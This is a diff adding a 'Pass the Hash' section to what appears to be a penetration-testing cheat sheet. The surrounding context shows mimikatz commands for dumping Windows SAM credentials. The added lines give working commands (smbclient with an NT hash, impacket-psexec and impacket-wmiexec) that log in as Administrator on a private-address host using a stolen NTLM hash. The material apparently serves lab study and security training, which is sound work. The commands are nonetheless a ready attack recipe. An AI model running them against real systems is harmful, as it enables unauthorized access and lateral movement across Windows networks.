@@ -194,3 +194,16 @@ privilege::debug
 token::elevate
 lsadump::sam
 ```
+
+## Pass the Hash
+
+1. Obtain the hash of a Windows user
+2. Log in with hash:
+
+```
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+or
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+or
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
